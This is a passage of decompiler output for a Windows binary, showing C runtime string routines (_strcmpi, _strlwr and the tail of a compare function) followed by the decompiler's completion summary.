          goto LABEL_14;
        --v3;
      }
      while ( v3 );
      v3 = 0;
      v8 = v6 < v7;
      if ( v6 == v7 )
        return v3;
LABEL_14:
      v3 = -1;
      if ( !v8 )
        v3 = 1;
    }
  }
  return v3;
}

//----- (0040C920) --------------------------------------------------------
int __cdecl _strcmpi(const char *String1, const char *String2)
{
  int result; // eax
  char v5; // t0
  int v6; // ebx
  int v7; // [esp-4h] [ebp-10h]

  if ( *((_DWORD *)&unk_493934 + 2) )
  {
    result = 255;
    v6 = 0;
    while ( (_BYTE)result )
    {
      LOBYTE(result) = *String2++;
      LOBYTE(v6) = *String1++;
      if ( (_BYTE)result != (_BYTE)v6 )
      {
        v7 = result;
        v6 = tolower_0(v6);
        result = tolower_0(v7);
        if ( (_BYTE)v6 != (_BYTE)result )
          return -((unsigned __int8)v6 < (unsigned __int8)result)
               - (((unsigned __int8)v6 < (unsigned __int8)result)
                - 1);
      }
    }
  }
  else
  {
    LOBYTE(result) = -1;
    while ( (_BYTE)result )
    {
      LOBYTE(result) = *String2++;
      BYTE1(result) = *String1++;
      if ( BYTE1(result) != (_BYTE)result )
      {
        v5 = BYTE1(result);
        BYTE1(result) = ((unsigned __int8)(result - 65) < 0x1Au ? 0x20 : 0) + result;
        LOBYTE(result) = ((unsigned __int8)(v5 - 65) < 0x1Au ? 0x20 : 0) + v5;
        if ( (_BYTE)result != BYTE1(result) )
        {
          LOBYTE(result) = -((unsigned __int8)result < BYTE1(result)) - (((unsigned __int8)result < BYTE1(result)) - 1);
          break;
        }
      }
    }
    result = (char)result;
  }
  return result;
}

//----- (0040C9AC) --------------------------------------------------------
char *__cdecl _strlwr(char *String)
{
  char *result; // eax
  char *i; // edx
  char v3; // cl
  size_t v4; // eax
  int v5; // edi
  CHAR *v6; // eax
  CHAR *lpMem; // [esp+4h] [ebp-4h]

  lpMem = 0;
  if ( dword_49393C )
  {
    v4 = __crtLCMapStringA(dword_49393C, 0x100u, String, -1, 0, 0, 0, 1);
    v5 = v4;
    if ( v4 )
    {
      v6 = (CHAR *)sub_409613(v4);
      lpMem = v6;
      if ( v6 )
      {
        if ( __crtLCMapStringA(dword_49393C, 0x100u, String, -1, v6, v5, 0, 1) )
          sub_407750();
      }
    }
    free(lpMem);
    result = String;
  }
  else
  {
    result = String;
    for ( i = String; *i; ++i )
    {
      v3 = *i;
      if ( *i >= 65 && v3 <= 90 )
        *i = v3 + 32;
    }
  }
  return result;
}

// nfuncs=256 queued=242 decompiled=242 lumina nreq=0 worse=0 better=0
// ALL OK, 242 function(s) have been successfully decompiled
